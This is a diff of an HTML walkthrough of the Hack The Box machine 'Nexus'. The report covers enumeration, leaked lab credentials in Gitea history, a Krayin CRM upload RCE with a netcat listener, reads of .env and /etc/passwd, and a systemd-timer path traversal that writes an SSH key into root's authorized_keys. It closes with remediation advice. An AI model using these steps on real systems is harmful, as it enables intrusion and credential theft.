@@ -1,167 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus - HTB Full Pwn Report</title>
-    <link rel="stylesheet" href="../style.css">
-    <style>
-      :root {
-        --bg: #0f172a;
-        --panel: #111827;
-        --panel-2: #1f2937;
-        --text: #e5e7eb;
-        --muted: #9ca3af;
-        --accent: #38bdf8;
-        --accent-2: #22c55e;
-        --warn: #f59e0b;
-        --danger: #ef4444;
-        --border: #334155;
-        --code-bg: #020617;
-      }
-      body {
-        margin: 0;
-        font-family: Arial, Helvetica, sans-serif;
-        background: var(--bg);
-        color: var(--text);
-        line-height: 1.6;
-      }
-      header {
-        padding: 52px 24px;
-        text-align: center;
-        background: linear-gradient(135deg, #111827 0%, #0f172a 55%, #082f49 100%);
-        border-bottom: 1px solid var(--border);
-      }
-      header h1 {
-        margin: 0;
-        font-size: 2.7rem;
-        letter-spacing: 1px;
-      }
-      header p {
-        color: var(--muted);
-        margin-top: 10px;
-        font-size: 1.05rem;
-      }
-      main.report {
-        max-width: 1120px;
-        margin: 0 auto;
-        padding: 32px 20px 64px;
-      }
-      h2 {
-        margin-top: 44px;
-        border-left: 5px solid var(--accent);
-        padding-left: 12px;
-        color: #f8fafc;
-      }
-      h3 {
-        margin-top: 30px;
-        color: #bae6fd;
-      }
-      h4 {
-        color: #bbf7d0;
-        margin-bottom: 6px;
-      }
-      p, li { color: var(--text); }
-      a { color: var(--accent); }
-      code {
-        background: rgba(2, 6, 23, 0.85);
-        color: #f8fafc;
-        padding: 2px 5px;
-        border-radius: 4px;
-      }
-      pre {
-        background: var(--code-bg);
-        color: #e2e8f0;
-        padding: 16px;
-        border-radius: 10px;
-        overflow-x: auto;
-        border: 1px solid var(--border);
-      }
-      pre code { background: transparent; padding: 0; }
-      .card {
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 14px;
-        padding: 18px;
-        margin: 18px 0;
-      }
-      .callout {
-        background: rgba(56, 189, 248, 0.08);
-        border-left: 4px solid var(--accent);
-        padding: 14px 16px;
-        border-radius: 8px;
-        margin: 18px 0;
-      }
-      .warning {
-        background: rgba(245, 158, 11, 0.08);
-        border-left: 4px solid var(--warn);
-      }
-      .success {
-        background: rgba(34, 197, 94, 0.08);
-        border-left: 4px solid var(--accent-2);
-      }
-      .danger {
-        background: rgba(239, 68, 68, 0.08);
-        border-left: 4px solid var(--danger);
-      }
-      .report-table {
-        width: 100%;
-        border-collapse: collapse;
-        margin: 18px 0;
-        background: var(--panel);
-        border: 1px solid var(--border);
-      }
-      .report-table th, .report-table td {
-        border: 1px solid var(--border);
-        padding: 10px;
-        text-align: left;
-        vertical-align: top;
-      }
-      .report-table th {
-        background: var(--panel-2);
-        color: #f8fafc;
-      }
-      .phase-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
-        gap: 14px;
-      }
-      .badge {
-        display: inline-block;
-        padding: 4px 8px;
-        border-radius: 999px;
-        background: #0c4a6e;
-        color: #e0f2fe;
-        font-size: 0.85rem;
-        margin: 2px;
-      }
-      .redacted {
-        color: #fca5a5;
-        font-weight: bold;
-      }
-      .toc ol {
-        columns: 2;
-        column-gap: 28px;
-      }
-      footer {
-        margin-top: 42px;
-        color: var(--muted);
-        font-size: 0.95rem;
-      }
-      @media (max-width: 720px) {
-        .toc ol { columns: 1; }
-        header h1 { font-size: 2.1rem; }
-      }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Nexus - HTB Report</title>
+    <link rel="stylesheet" href="../style.css" />
   </head>
   <body>
-    <header>
-      <h1>Nexus</h1>
-      <p>Hack The Box Full Pwn Report | Gitea Credential Disclosure → Krayin CRM RCE → Credential Reuse → systemd Timer Path Traversal → Root</p>
+    <header class="site-header">
+      <nav class="nav">
+        <a class="brand" href="../index.html">HTB Reports</a>
+        <a class="nav-pill" href="../index.html">All reports</a>
+      </nav>
     </header>
-    <main class="report">
+
+    <section class="hero">
+      <div class="hero-card">
+        <p class="eyebrow">Hack The Box Walkthrough</p>
+        <h1 class="main-title">Nexus</h1>
+        <p class="subtitle">Hack The Box retired machine report</p>
+      </div>
+    </section>
+
+    <div class="layout">
+      <aside>
+        <h2>Contents</h2>
+        <div class="toc"><a href="#machine-information">Machine Information</a><a href="#report-structure">Report Structure</a><a href="#completed-attack-chain">Completed Attack Chain</a><a href="#executive-summary">Executive Summary</a><a href="#key-findings">Key Findings</a><a href="#phase-1-reconnaissance-and-information-gathering">Phase 1: Reconnaissance and Information Gathering</a><a class="toc-sub" href="#initial-port-scan">Initial Port Scan</a><a class="toc-sub" href="#service-enumeration">Service Enumeration</a><a href="#phase-2-web-enumeration">Phase 2: Web Enumeration</a><a class="toc-sub" href="#http-header-review">HTTP Header Review</a><a class="toc-sub" href="#technology-fingerprinting">Technology Fingerprinting</a><a class="toc-sub" href="#directory-enumeration">Directory Enumeration</a><a class="toc-sub" href="#virtual-host-enumeration">Virtual Host Enumeration</a><a href="#phase-3-application-enumeration">Phase 3: Application Enumeration</a><a class="toc-sub" href="#billing-application">Billing Application</a><a class="toc-sub" href="#gitea-application">Gitea Application</a><a href="#phase-4-credential-disclosure">Phase 4: Credential Disclosure</a><a class="toc-sub" href="#exposed-env-file">Exposed .env File</a><a class="toc-sub" href="#credential-reuse-against-krayin-crm">Credential Reuse Against Krayin CRM</a><a href="#phase-5-initial-exploitation">Phase 5: Initial Exploitation</a><a class="toc-sub" href="#krayin-crm-authenticated-file-upload-rce">Krayin CRM Authenticated File Upload RCE</a><a href="#phase-6-post-exploitation-enumeration">Phase 6: Post-Exploitation Enumeration</a><a class="toc-sub" href="#application-configuration-review">Application Configuration Review</a><a class="toc-sub" href="#local-user-discovery">Local User Discovery</a><a class="toc-sub" href="#ssh-access-as-jones">SSH Access as jones</a><a href="#phase-7-privilege-escalation">Phase 7: Privilege Escalation</a><a class="toc-sub" href="#sudo-enumeration">Sudo Enumeration</a><a class="toc-sub" href="#systemd-timer-discovery">Systemd Timer Discovery</a><a class="toc-sub" href="#vulnerable-script-analysis">Vulnerable Script Analysis</a><a class="toc-sub" href="#exploitation-strategy">Exploitation Strategy</a><a class="toc-sub" href="#ssh-key-generation">SSH Key Generation</a><a class="toc-sub" href="#template-repository-creation">Template Repository Creation</a><a class="toc-sub" href="#malicious-git-tree-creation">Malicious Git Tree Creation</a><a class="toc-sub" href="#root-access">Root Access</a><a href="#phase-8-lessons-learned">Phase 8: Lessons Learned</a><a class="toc-sub" href="#1-source-control-history-matters">1. Source Control History Matters</a><a class="toc-sub" href="#2-password-reuse-expands-impact">2. Password Reuse Expands Impact</a><a class="toc-sub" href="#3-authenticated-vulnerabilities-are-still-critical">3. Authenticated Vulnerabilities Are Still Critical</a><a class="toc-sub" href="#4-systemd-timers-are-important-privilege-escalation-targets">4. Systemd Timers Are Important Privilege Escalation Targets</a><a class="toc-sub" href="#5-never-trust-file-paths-from-user-controlled-sources">5. Never Trust File Paths from User-Controlled Sources</a><a href="#remediation-recommendations">Remediation Recommendations</a><a class="toc-sub" href="#remove-secrets-from-git-history">Remove Secrets from Git History</a><a class="toc-sub" href="#enforce-unique-credentials">Enforce Unique Credentials</a><a class="toc-sub" href="#patch-or-mitigate-krayin-crm">Patch or Mitigate Krayin CRM</a><a class="toc-sub" href="#harden-file-upload-handling">Harden File Upload Handling</a><a class="toc-sub" href="#secure-root-executed-automation">Secure Root-Executed Automation</a><a class="toc-sub" href="#review-custom-systemd-services-and-timers">Review Custom systemd Services and Timers</a><a href="#final-attack-chain">Final Attack Chain</a><a href="#conclusion">Conclusion</a></div>
+      </aside>
+
+      <main class="report-shell">
+        <div id="overview"></div>
+        
       <section class="card">
-        <h2>Machine Information</h2>
+        <h2 id="machine-information">Machine Information</h2>
         <table class="report-table">
           <tbody>
             <tr><th>Name</th><td>Nexus</td></tr>
@@ -178,7 +49,7 @@
       </section>
 
       <section class="card toc">
-        <h2>Report Structure</h2>
+        <h2 id="report-structure">Report Structure</h2>
         <ol>
           <li>Executive Summary</li>
           <li>Key Findings</li>
@@ -196,7 +67,7 @@
       </section>
 
       <section class="card">
-        <h2>Completed Attack Chain</h2>
+        <h2 id="completed-attack-chain">Completed Attack Chain</h2>
         <div class="callout success">
           <strong>Path:</strong>
           <code>HTTP enumeration</code> → <code>vhost discovery</code> → <code>Gitea repository history</code> →
@@ -207,11 +78,11 @@
       </section>
 
 
-<h2>Executive Summary</h2>
+<h2 id="executive-summary">Executive Summary</h2>
 <p>Nexus was a Linux-based Hack The Box machine exposing SSH and HTTP. Initial enumeration identified a public-facing Nexus Energy Authority website, a billing application, and a self-hosted Gitea instance. The main attack chain began with virtual host discovery, followed by enumeration of the Gitea web application. A public repository contained a Krayin CRM Docker setup with an exposed <code>.env</code> file. Although the current <code>.env</code> no longer contained a database password, review of a previous commit revealed a reused password.</p>
 <p>The recovered password allowed authenticated access to the Krayin CRM billing portal as <code>j.matthew@nexus.htb</code>. After logging in, the application was identified as Krayin CRM 2.2.0, which was vulnerable to an authenticated unrestricted file upload leading to remote code execution. Exploitation provided a reverse shell as <code>www-data</code>.</p>
 <p>Post-exploitation enumeration of the Krayin application directory revealed another <code>.env</code> file containing database credentials. Password reuse allowed SSH access as the local user <code>jones</code>, which led to the user flag. Privilege escalation was achieved by identifying a root-owned systemd timer that executed a custom Gitea template synchronization script every minute. The script processed Gitea template repositories and wrote files based on Git tree paths without properly sanitizing path traversal. By creating a malicious Gitea template repository and pushing a crafted Git tree, an SSH public key was written to <code>/root/.ssh/authorized_keys</code>, allowing SSH access as root.</p>
-<h2>Key Findings</h2>
+<h2 id="key-findings">Key Findings</h2>
 <table class="report-table">
 <thead><tr>
 <th>Severity</th>
@@ -224,15 +95,15 @@
 <tr><td>High</td><td>Password reuse across services</td><td>Lateral movement from web application to SSH user</td></tr>
 <tr><td>Medium</td><td>Application debug indicators and exposed service metadata</td><td>Increased attacker visibility into the stack</td></tr>
 </tbody></table>
-<h2>Phase 1: Reconnaissance and Information Gathering</h2>
-<h3>Initial Port Scan</h3>
+<h2 id="phase-1-reconnaissance-and-information-gathering">Phase 1: Reconnaissance and Information Gathering</h2>
+<h3 id="initial-port-scan">Initial Port Scan</h3>
 <p>An initial Nmap scan identified two open TCP ports:</p>
 <pre><code>nmap 10.129.234.54 -o basic-scan</code></pre>
 <pre><code>PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http</code></pre>
 <p>Only SSH and HTTP were exposed externally, which indicated that the likely initial foothold would come from web application enumeration rather than direct SSH access.</p>
-<h3>Service Enumeration</h3>
+<h3 id="service-enumeration">Service Enumeration</h3>
 <p>A targeted Nmap service scan was performed against the discovered ports:</p>
 <pre><code>nmap -sC -sV -p 22,80 10.129.234.54 -o full_scan</code></pre>
 <pre><code>22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
@@ -240,8 +111,8 @@
 <p>The HTTP service hosted a site titled:</p>
 <pre><code>Nexus Energy Authority — Powering the Nation&#x27;s Future</code></pre>
 <p>SSH password authentication was available, but no valid credentials were known at this stage.</p>
-<h2>Phase 2: Web Enumeration</h2>
-<h3>HTTP Header Review</h3>
+<h2 id="phase-2-web-enumeration">Phase 2: Web Enumeration</h2>
+<h3 id="http-header-review">HTTP Header Review</h3>
 <p>The root web application responded normally over HTTP:</p>
 <pre><code>curl -I http://nexus.htb</code></pre>
 <pre><code>HTTP/1.1 200 OK
@@ -249,17 +120,17 @@ Server: nginx/1.24.0 (Ubuntu)
 Content-Type: text/html
 Content-Length: 49296</code></pre>
 <p>No immediate vulnerability was identified from the headers alone.</p>
-<h3>Technology Fingerprinting</h3>
+<h3 id="technology-fingerprinting">Technology Fingerprinting</h3>
 <p><code>whatweb</code> identified the site as a static HTML5 page served by nginx. More importantly, it revealed two email addresses:</p>
 <pre><code>whatweb http://nexus.htb</code></pre>
 <pre><code>Email[careers@nexus.htb,j.matthew@nexus.htb]</code></pre>
 <p>The email address <code>j.matthew@nexus.htb</code> later became useful during authentication attempts against the billing application.</p>
-<h3>Directory Enumeration</h3>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
 <p>Directory brute forcing against the main site identified only the default page:</p>
 <pre><code>gobuster dir -u http://nexus.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
 <pre><code>/index.html (Status: 200)</code></pre>
 <p>This suggested the main site was mostly static and that additional attack surface might exist on virtual hosts.</p>
-<h3>Virtual Host Enumeration</h3>
+<h3 id="virtual-host-enumeration">Virtual Host Enumeration</h3>
 <p>Virtual host discovery identified two additional web applications:</p>
 <pre><code>gobuster vhost -u http://nexus.htb \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
@@ -268,8 +139,8 @@ Content-Length: 49296</code></pre>
 Found: git.nexus.htb     Status: 200</code></pre>
 <p>The following entries were added to <code>/etc/hosts</code>:</p>
 <pre><code>10.129.234.54 nexus.htb billing.nexus.htb git.nexus.htb</code></pre>
-<h2>Phase 3: Application Enumeration</h2>
-<h3>Billing Application</h3>
+<h2 id="phase-3-application-enumeration">Phase 3: Application Enumeration</h2>
+<h3 id="billing-application">Billing Application</h3>
 <p>The billing application redirected to an administrative login page:</p>
 <pre><code>curl -I http://billing.nexus.htb</code></pre>
 <pre><code>HTTP/1.1 302 Found
@@ -283,7 +154,7 @@ Set-Cookie: krayin_crm_session=...</code></pre>
 UncommonHeaders[phpdebugbar-id]
 Cookies[XSRF-TOKEN,krayin_crm_session]</code></pre>
 <p>At this point, valid credentials were still required.</p>
-<h3>Gitea Application</h3>
+<h3 id="gitea-application">Gitea Application</h3>
 <p>The second virtual host was identified as a Gitea instance:</p>
 <pre><code>whatweb http://git.nexus.htb</code></pre>
 <pre><code>PoweredBy[Gitea]
@@ -296,8 +167,8 @@ Location: /explore/repos</code></pre>
 <p>Browsing <code>/explore/repos</code> revealed a public repository:</p>
 <pre><code>admin/krayin-docker-setup</code></pre>
 <p>This repository contained a <code>.env</code> file for the Krayin CRM deployment.</p>
-<h2>Phase 4: Credential Disclosure</h2>
-<h3>Exposed <code>.env</code> File</h3>
+<h2 id="phase-4-credential-disclosure">Phase 4: Credential Disclosure</h2>
+<h3 id="exposed-env-file">Exposed <code>.env</code> File</h3>
 <p>The current <code>.env</code> file contained application configuration but did not include a database password:</p>
 <pre><code>DB_CONNECTION=mysql
 DB_HOST=krayin-mysql
@@ -309,13 +180,13 @@ DB_PASSWORD=</code></pre>
 <pre><code>DB_USERNAME=krayin
 DB_PASSWORD=N27xh!!2ucY04</code></pre>
 <p>This was a significant finding because the password was stored in source control history even though it had been removed from the current version.</p>
-<h3>Credential Reuse Against Krayin CRM</h3>
+<h3 id="credential-reuse-against-krayin-crm">Credential Reuse Against Krayin CRM</h3>
 <p>Using the previously discovered email address and the password from the old commit, authentication to the billing portal succeeded:</p>
 <pre><code>Username: j.matthew@nexus.htb
 Password: N27xh!!2ucY04</code></pre>
 <p>After login, the application version was identified as Krayin CRM 2.2.0.</p>
-<h2>Phase 5: Initial Exploitation</h2>
-<h3>Krayin CRM Authenticated File Upload RCE</h3>
+<h2 id="phase-5-initial-exploitation">Phase 5: Initial Exploitation</h2>
+<h3 id="krayin-crm-authenticated-file-upload-rce">Krayin CRM Authenticated File Upload RCE</h3>
 <p>Krayin CRM 2.2.0 was vulnerable to an authenticated unrestricted file upload issue affecting the TinyMCE upload functionality. Because valid credentials were available, a PHP payload was uploaded and executed from the public TinyMCE storage path.</p>
 <p>A Netcat listener was started on the attacking machine:</p>
 <pre><code>nc -lvnp 4444</code></pre>
@@ -334,8 +205,8 @@ artisan
 composer.json
 storage/
 vendor/</code></pre>
-<h2>Phase 6: Post-Exploitation Enumeration</h2>
-<h3>Application Configuration Review</h3>
+<h2 id="phase-6-post-exploitation-enumeration">Phase 6: Post-Exploitation Enumeration</h2>
+<h3 id="application-configuration-review">Application Configuration Review</h3>
 <p>The local application <code>.env</code> file was readable by <code>www-data</code>:</p>
 <pre><code>cat ~/krayin/.env</code></pre>
 <p>It contained a different database password:</p>
@@ -344,22 +215,22 @@ DB_HOST=127.0.0.1
 DB_DATABASE=krayin
 DB_USERNAME=krayin
 DB_PASSWORD=y27xb3ha!!74GbR</code></pre>
-<h3>Local User Discovery</h3>
+<h3 id="local-user-discovery">Local User Discovery</h3>
 <p>Reviewing <code>/etc/passwd</code> identified two interactive users:</p>
 <pre><code>cat /etc/passwd</code></pre>
 <pre><code>root:x:0:0:root:/root:/bin/bash
 jones:x:1000:1000:,,,:/home/jones:/bin/bash
 git:x:111:112:Git Version Control,,,:/home/git:/bin/bash</code></pre>
 <p>The password found in the Krayin <code>.env</code> file was reused for SSH access as <code>jones</code>.</p>
-<h3>SSH Access as <code>jones</code></h3>
+<h3 id="ssh-access-as-jones">SSH Access as <code>jones</code></h3>
 <pre><code>ssh jones@10.129.234.54</code></pre>
 <p>Authentication succeeded, providing a stable user shell:</p>
 <pre><code>jones@nexus:~$</code></pre>
 <p>User-level access was confirmed by reading <code>user.txt</code>. The flag value is redacted in this public report.</p>
 <pre><code>cat user.txt
 [REDACTED]</code></pre>
-<h2>Phase 7: Privilege Escalation</h2>
-<h3>Sudo Enumeration</h3>
+<h2 id="phase-7-privilege-escalation">Phase 7: Privilege Escalation</h2>
+<h3 id="sudo-enumeration">Sudo Enumeration</h3>
 <p>The <code>jones</code> user did not have sudo privileges:</p>
 <pre><code>sudo -l</code></pre>
 <pre><code>Sorry, user jones may not run sudo on nexus.</code></pre>
@@ -367,7 +238,7 @@ git:x:111:112:Git Version Control,,,:/home/git:/bin/bash</code></pre>
 <pre><code>sudo -V</code></pre>
 <pre><code>Sudo version 1.9.15p5</code></pre>
 <p>Since sudo was not available, additional local privilege escalation enumeration was required.</p>
-<h3>Systemd Timer Discovery</h3>
+<h3 id="systemd-timer-discovery">Systemd Timer Discovery</h3>
 <p>Systemd timers were reviewed as part of standard Linux privilege escalation enumeration:</p>
 <pre><code>systemctl list-timers</code></pre>
 <p>A custom timer related to Gitea template synchronization was identified. The timer and service configuration showed that the task executed every minute as root:</p>
@@ -396,7 +267,7 @@ User=root
 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
 TimeoutStartSec=50s</code></pre>
 <p>This was highly suspicious because a custom Python script was being executed as root on a recurring schedule.</p>
-<h3>Vulnerable Script Analysis</h3>
+<h3 id="vulnerable-script-analysis">Vulnerable Script Analysis</h3>
 <p>The script <code>/etc/gitea/template-sync.py</code> searched Gitea for repositories marked as templates, read each template repository&#x27;s Git tree, and wrote blob contents into a staging directory.</p>
 <p>Important configuration values:</p>
 <pre><code>GITEA_URL = &quot;http://localhost:3000&quot;
@@ -412,7 +283,7 @@ os.makedirs(target_dir, exist_ok=True)
 with open(target, &#x27;wb&#x27;) as f:
     f.write(cat_result.stdout)</code></pre>
 <p>Because <code>filepath</code> came directly from the Git tree, a malicious repository could include traversal components such as <code>../</code>. Since the script ran as root, this created an arbitrary file write primitive as root.</p>
-<h3>Exploitation Strategy</h3>
+<h3 id="exploitation-strategy">Exploitation Strategy</h3>
 <p>The objective was to write an SSH public key into root&#x27;s authorized keys file:</p>
 <pre><code>/root/.ssh/authorized_keys</code></pre>
 <p>The attack flow was:</p>
@@ -424,12 +295,12 @@ with open(target, &#x27;wb&#x27;) as f:
 <li>Wait for the root-owned timer to process the template repository.</li>
 <li>SSH into the target as root using the private key.</li>
 </ol>
-<h3>SSH Key Generation</h3>
+<h3 id="ssh-key-generation">SSH Key Generation</h3>
 <p>On the attacking machine:</p>
 <pre><code>ssh-keygen -t ed25519 -f /tmp/.nexus_root -N &#x27;&#x27;</code></pre>
 <p>The public key was saved as:</p>
 <pre><code>/tmp/.nexus_root.pub</code></pre>
-<h3>Template Repository Creation</h3>
+<h3 id="template-repository-creation">Template Repository Creation</h3>
 <p>A Gitea repository was created as <code>jones</code>:</p>
 <pre><code>jones/template_repo</code></pre>
 <p>The repository was marked as a template repository so that it would be processed by the root-owned sync script.</p>
@@ -446,13 +317,13 @@ git push -u origin main</code></pre>
 <pre><code>cat /var/log/template-sync.log</code></pre>
 <pre><code>Syncing template: jones/template_repo
 synced: README.md</code></pre>
-<h3>Malicious Git Tree Creation</h3>
+<h3 id="malicious-git-tree-creation">Malicious Git Tree Creation</h3>
 <p>A script was used to construct a Git tree containing traversal entries that resolved to <code>/root/.ssh/authorized_keys</code>. The blob content was the attacker&#x27;s SSH public key.</p>
 <p>The malicious tree was pushed to the Gitea repository:</p>
 <pre><code>python3 build.py
 git push -f origin main</code></pre>
 <p>After the timer executed, the root-run script processed the malicious template repository and wrote the public key into root&#x27;s SSH authorized keys file.</p>
-<h3>Root Access</h3>
+<h3 id="root-access">Root Access</h3>
 <p>Root SSH access was obtained using the generated private key:</p>
 <pre><code>ssh -i /tmp/.nexus_root root@nexus.htb</code></pre>
 <p>Successful authentication resulted in a root shell:</p>
@@ -460,27 +331,27 @@ git push -f origin main</code></pre>
 <p>Root-level access was confirmed by reading <code>/root/root.txt</code>. The flag value is redacted in this public report.</p>
 <pre><code>cat /root/root.txt
 [REDACTED]</code></pre>
-<h2>Phase 8: Lessons Learned</h2>
-<h3>1. Source Control History Matters</h3>
+<h2 id="phase-8-lessons-learned">Phase 8: Lessons Learned</h2>
+<h3 id="1-source-control-history-matters">1. Source Control History Matters</h3>
 <p>The current <code>.env</code> file did not contain a database password, but repository history did. Sensitive data committed to Git remains recoverable unless it is properly purged from history. Simply deleting a secret in a later commit is not sufficient.</p>
-<h3>2. Password Reuse Expands Impact</h3>
+<h3 id="2-password-reuse-expands-impact">2. Password Reuse Expands Impact</h3>
 <p>The password recovered from the Gitea repository allowed access to Krayin CRM. A separate password found in the application <code>.env</code> file allowed SSH access as <code>jones</code>. Reusing credentials across services allowed the attack to move from web application access to local system access.</p>
-<h3>3. Authenticated Vulnerabilities Are Still Critical</h3>
+<h3 id="3-authenticated-vulnerabilities-are-still-critical">3. Authenticated Vulnerabilities Are Still Critical</h3>
 <p>The Krayin CRM issue required authentication, but the exposed credentials made exploitation possible. Authenticated vulnerabilities should not be considered low risk when credential leakage exists elsewhere in the environment.</p>
-<h3>4. Systemd Timers Are Important Privilege Escalation Targets</h3>
+<h3 id="4-systemd-timers-are-important-privilege-escalation-targets">4. Systemd Timers Are Important Privilege Escalation Targets</h3>
 <p>Custom timers and services often reveal scripts that run automatically as privileged users. In this case, the systemd service clearly showed that <code>/etc/gitea/template-sync.py</code> executed as root every minute.</p>
-<h3>5. Never Trust File Paths from User-Controlled Sources</h3>
+<h3 id="5-never-trust-file-paths-from-user-controlled-sources">5. Never Trust File Paths from User-Controlled Sources</h3>
 <p>The privilege escalation worked because the root-owned script trusted file paths from a Git repository. Before writing files, scripts should normalize paths, reject traversal sequences, and verify that the final resolved path remains inside the intended directory.</p>
-<h2>Remediation Recommendations</h2>
-<h3>Remove Secrets from Git History</h3>
+<h2 id="remediation-recommendations">Remediation Recommendations</h2>
+<h3 id="remove-secrets-from-git-history">Remove Secrets from Git History</h3>
 <p>Sensitive values such as database passwords, API keys, and application secrets should never be committed to repositories. Any exposed secrets should be rotated immediately, and Git history should be rewritten to remove the leaked values.</p>
-<h3>Enforce Unique Credentials</h3>
+<h3 id="enforce-unique-credentials">Enforce Unique Credentials</h3>
 <p>Each service account and user account should use unique credentials. Password reuse between applications, databases, and SSH accounts should be prohibited.</p>
-<h3>Patch or Mitigate Krayin CRM</h3>
+<h3 id="patch-or-mitigate-krayin-crm">Patch or Mitigate Krayin CRM</h3>
 <p>The Krayin CRM instance should be upgraded to a fixed version. File upload functionality should enforce strict validation, including file extension restrictions, MIME validation, storage outside the web root, and server-side execution prevention.</p>
-<h3>Harden File Upload Handling</h3>
+<h3 id="harden-file-upload-handling">Harden File Upload Handling</h3>
 <p>Uploaded files should not be directly executable by the web server. Public upload directories should be configured to block PHP execution.</p>
-<h3>Secure Root-Executed Automation</h3>
+<h3 id="secure-root-executed-automation">Secure Root-Executed Automation</h3>
 <p>The Gitea template sync script should not process attacker-controlled paths as root. If privileged automation is required, it should run with the least privileges necessary and should validate all file paths before writing.</p>
 <p>Recommended safe path handling:</p>
 <pre><code>target = os.path.realpath(os.path.join(stage_path, filepath))
@@ -488,9 +359,9 @@ safe_base = os.path.realpath(stage_path)
 
 if not target.startswith(safe_base + os.sep):
     raise ValueError(&quot;Path traversal attempt blocked&quot;)</code></pre>
-<h3>Review Custom systemd Services and Timers</h3>
+<h3 id="review-custom-systemd-services-and-timers">Review Custom systemd Services and Timers</h3>
 <p>Administrators should periodically review custom systemd timers and services for unsafe execution contexts, weak permissions, and unsafe scripts.</p>
-<h2>Final Attack Chain</h2>
+<h2 id="final-attack-chain">Final Attack Chain</h2>
 <pre><code>Open ports discovered: 22/SSH and 80/HTTP
         ↓
 Virtual host enumeration found billing.nexus.htb and git.nexus.htb
@@ -514,12 +385,18 @@ Template sync script trusted attacker-controlled Git file paths
 Malicious template repo wrote SSH key to /root/.ssh/authorized_keys
         ↓
 SSH access obtained as root</code></pre>
-<h2>Conclusion</h2>
+<h2 id="conclusion">Conclusion</h2>
 <p>Nexus demonstrated a realistic multi-stage compromise involving web enumeration, source control leakage, credential reuse, authenticated remote code execution, local enumeration, and unsafe privileged automation. The most important lesson from this machine is that low-effort configuration mistakes, such as exposed repository history and reused passwords, can combine with application vulnerabilities and unsafe automation to produce full system compromise.</p>
       <footer>
         <p><a href="../index.html">Back to all reports</a></p>
         <p>Report prepared as a professional HTB-style writeup. Flag values are redacted for public sharing.</p>
       </footer>
-    </main>
+    
+        <footer class="report-footer">
+          <a class="back-link" href="../index.html">Back to all reports</a>
+          <p class="footer-note">HTB report • aligned with the Blocky layout</p>
+        </footer>
+      </main>
+    </div>
   </body>
 </html>
